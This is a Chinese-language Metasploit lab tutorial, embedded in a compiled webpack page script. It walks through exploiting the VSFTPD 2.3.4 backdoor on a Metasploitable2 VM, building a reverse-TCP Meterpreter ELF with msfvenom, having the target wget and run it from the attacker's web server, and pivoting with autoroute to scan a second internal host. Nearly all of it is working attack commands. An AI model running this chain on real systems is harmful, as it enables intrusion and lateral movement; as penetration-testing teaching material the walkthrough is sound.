(window.webpackJsonp=window.webpackJsonp||[]).push([[261],{552:function(s,a,e){"use strict";e.r(a);var t=e(7),r=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit攻击vsftpd2-3-4后门漏洞并渗透内网"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit攻击vsftpd2-3-4后门漏洞并渗透内网"}},[s._v("#")]),s._v(" Metasploit攻击VSFTPD2.3.4后门漏洞并渗透内网")]),s._v(" "),a("p",[s._v("攻击机：Kali 192.168.109.137")]),s._v(" "),a("p",[s._v("靶机：Metasploitable2 192.168.109.140")]),s._v(" "),a("p",[s._v("内网另一主机： Metasploitable2 192.168.109.159")]),s._v(" "),a("p",[s._v("工具：Metasploit")]),s._v(" "),a("h2",{attrs:{id:"开启msf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#开启msf"}},[s._v("#")]),s._v(" 开启MSF")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msfconsole\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"扫描指定主机的服务和端口"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#扫描指定主机的服务和端口"}},[s._v("#")]),s._v(" 扫描指定主机的服务和端口")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("nmap -sV -p 21,22,25,80,110,443,445 192.168.109.140\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果要存入MSF的数据库，则：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("db_nmap -sV -p 21,22,25,80,110,443,445 192.168.109.140\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"列出在目标端口上运行的服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#列出在目标端口上运行的服务"}},[s._v("#")]),s._v(" 列出在目标端口上运行的服务")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("services\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"过滤服务只显示开启的服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#过滤服务只显示开启的服务"}},[s._v("#")]),s._v(" 过滤服务只显示开启的服务")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("services -u\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"列出数据库中所有的主机"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#列出数据库中所有的主机"}},[s._v("#")]),s._v(" 列出数据库中所有的主机")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("hosts\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"漏洞攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞攻击"}},[s._v("#")]),s._v(" 漏洞攻击")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use exploit/unix/ftp/vsftpd_234_backdoor\nshow options\nset RHOST 192.168.109.140\nset RPORT 21\nshow payloads\nset payload cmd/unix/interact\nexploit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("注：所有操作都是在MSF终端下")]),s._v(" "),a("p",[a("strong",[s._v("这里，我们继续将Shell控制升级为Meterpreter命令行。")])]),s._v(" "),a("p",[s._v("在攻击机Kali上重新开启一个终端：")]),s._v(" "),a("h2",{attrs:{id:"生成反弹木马"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#生成反弹木马"}},[s._v("#")]),s._v(" 生成反弹木马")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST 192.168.109.137 LPORT 4444 -f elf > backdoor.elf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("注：elf是Linux系统下的默认扩展名")]),s._v(" "),a("h2",{attrs:{id:"启动kali上的apache服务-并将backdoor-elf放置到服务器中"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#启动kali上的apache服务-并将backdoor-elf放置到服务器中"}},[s._v("#")]),s._v(" 启动Kali上的Apache服务，并将backdoor.elf放置到服务器中")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("service apache2 start\nmv backdoor.elf /var/www/html/\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("这样，就可以让目标系统从我们的计算机中下载这个木马文件了。")]),s._v(" "),a("h2",{attrs:{id:"在目标机上下载木马文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在目标机上下载木马文件"}},[s._v("#")]),s._v(" 在目标机上下载木马文件")]),s._v(" "),a("p",[s._v("切换到第6步的终端，执行命令：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("wget http://192.168.109.137/backdoor.elf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("即将木马文件下载到了目标机上")]),s._v(" "),a("h2",{attrs:{id:"在新开启的终端上执行如下命令"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在新开启的终端上执行如下命令"}},[s._v("#")]),s._v(" 在新开启的终端上执行如下命令")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msfconsole\nuse exploit/multi/handler\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 4444\nexploit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("h2",{attrs:{id:"在目标机上运行木马文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#在目标机上运行木马文件"}},[s._v("#")]),s._v(" 在目标机上运行木马文件")]),s._v(" "),a("p",[s._v("切换到第6步的终端，执行命令：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("chmod 7777 backdoor.elf\n./backdoor.elf\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"查看反弹的meterpreter终端"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看反弹的meterpreter终端"}},[s._v("#")]),s._v(" 查看反弹的Meterpreter终端")]),s._v(" "),a("p",[s._v("回到新开启的终端上查看，此时，我们看到已经反弹回Meterpreter命令行了。")]),s._v(" "),a("p",[s._v("接下来，就可以在Meterpreter终端进行操作了。")]),s._v(" "),a("p",[a("strong",[s._v("下面，我们渗透内部网络。")])]),s._v(" "),a("h2",{attrs:{id:"查看arp内容"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#查看arp内容"}},[s._v("#")]),s._v(" 查看ARP内容")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("arp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("由输出可以看出，内网中有另一主机IP地址为：192.168.109.159")]),s._v(" "),a("p",[a("strong",[s._v("为了渗透进入这个内部网络，需要在成功渗透的主机上使用autoroute命令来设置跳板。")])]),s._v(" "),a("h2",{attrs:{id:"设置跳板"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#设置跳板"}},[s._v("#")]),s._v(" 设置跳板")]),s._v(" "),a("p",[s._v("在Meterpreter终端执行：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("run autoroute -p\nrun autoroute -s 192.168.109.0 255.255.255.0\nrun autoroute -p\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("此时，我们的MSF就可以通过这个Meterpreter会话连接到内部网络。")]),s._v(" "),a("h2",{attrs:{id:"将meterpreter会话切换到后台"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#将meterpreter会话切换到后台"}},[s._v("#")]),s._v(" 将Meterpreter会话切换到后台")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("background\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("接下来就对这个网络中IP地址为192.168.109.159的主机使用auxiliary/scanner/portscan/tcp辅助模块进行一次端口扫描")]),s._v(" "),a("h2",{attrs:{id:"对内网主机192-168-109-159进行端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对内网主机192-168-109-159进行端口扫描"}},[s._v("#")]),s._v(" 对内网主机192.168.109.159进行端口扫描")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/portscan/tcp\nshow options\nsetg RHOSTS 192.168.109.159\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("注意：设置RHOSTS的值时，这里使用的是setg命令，这样就会使RHOSTS的值设置为全局的192.168.109.159，从而无需反复输入这个命令。")]),s._v(" "),a("p",[s._v("由输出可知，在192.168.109.159上运行着很多服务，而且80端口是开放的。接下来使用auxiliary/scanner/http/http_version来验证目标主机在80端口上运行的服务。")]),s._v(" "),a("h2",{attrs:{id:"验证192-168-109-159-80端口运行的服务"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#验证192-168-109-159-80端口运行的服务"}},[s._v("#")]),s._v(" 验证192.168.109.159 80端口运行的服务")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/http/http_version\nshow options\nset RHOSTS 192.168.109.159\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("由输出可知，在主机80端口上运行的是Apache2.2.8服务器，其中的PHP 5.2.4版本是存在漏洞的，可以被攻击者获取对目标系统的控制。")]),s._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=r.exports}}]);